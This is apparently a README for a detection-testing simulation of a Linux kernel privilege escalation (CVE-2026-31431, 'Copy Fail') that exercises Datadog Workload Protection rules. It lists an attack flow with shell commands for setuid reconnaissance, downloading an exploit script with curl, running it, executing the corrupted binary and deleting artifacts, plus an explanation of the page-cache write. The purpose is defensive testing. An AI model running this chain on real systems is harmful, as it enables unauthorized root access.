# Copy Fail Simulation — CVE-2026-31431 Privilege Escalation

## Abstract

This educational security simulation demonstrates the **CVE-2026-31431 (Copy Fail)** privilege escalation exploit chain. Copy Fail is a logic bug in the Linux kernel's `authencesn` AEAD template that allows an unprivileged local user to perform a controlled 4-byte write into the page cache of any readable file, corrupting setuid binaries to achieve root.

The simulation reproduces the observable syscall sequence so that Datadog Workload Protection's **three-stage chained agent detection** can fire:

1. **AF_ALG bind**: An unprivileged process binds an `AF_ALG` socket with the `authencesn(hmac(sha256),cbc(aes))` template
2. **SOL_ALG setsockopt**: The same process calls `setsockopt` with `SOL_ALG` (level 279)
3. **Setuid splice**: The same process splices from a setuid binary (`/usr/bin/su`)

No actual page cache corruption or privilege escalation occurs.

## Attack Scenario Details

### Vulnerability Exploited
- **CVE-2026-31431**: Linux kernel `authencesn` AEAD template page cache corruption
- **Entry point**: Command injection in vulnerable web application

### Attack Flow

1. **Reconnaissance**: Check for `algif_aead` module and locate setuid binaries
   ```bash
   lsmod | grep algif_aead
   find /usr/bin -perm -4000 -type f
   ```

2. **Exploit Download**: Retrieve the exploit script
   ```bash
   curl -o /tmp/copy-fail.py https://raw.githubusercontent.com/.../simulate-exploit.py
   ```

3. **Exploit Execution**: Run the three-stage syscall chain
   ```bash
   python3 /tmp/copy-fail.py
   ```

4. **Post-Exploitation**: Execute the corrupted setuid binary
   ```bash
   su -c 'id' nobody
   ```

5. **Cleanup**: Remove artifacts
   ```bash
   rm -f /tmp/copy-fail.py
   ```

### Technical Details

The real Copy Fail exploit works as follows:

- `AF_ALG` is an unprivileged socket type exposing the kernel's crypto subsystem
- When splicing a file into an `AF_ALG` socket, the kernel's input scatterlist holds direct references to page cache pages
- The `authencesn` template performs a 4-byte scratch write past the output boundary into chained page cache pages
- The attacker controls: target file, offset within file, and the 4-byte value written
- The page cache write persists but the on-disk file is unchanged — file integrity tools cannot detect it
- Executing the corrupted setuid binary loads the page cache version and runs attacker shellcode as root

### Detection Coverage

The **CVE-2026-31431 Content Pack** in Workload Protection detects the full exploit chain using three chained agent rules that must fire within the same process in a 30-second window. A backend detection rule generates critical-severity signals. The existing `suid_file_execution_v2` rule provides additional coverage for the post-corruption phase.

## Usage

```bash
kubectl exec -it -n playground deploy/playground-app -- /scenarios/copy-fail/detonate.sh --wait
```

## Security Notice

This simulation uses a **harmless exploit simulator** that emits syscalls without performing any actual page cache corruption or privilege escalation. It should only be run in isolated, educational environments.
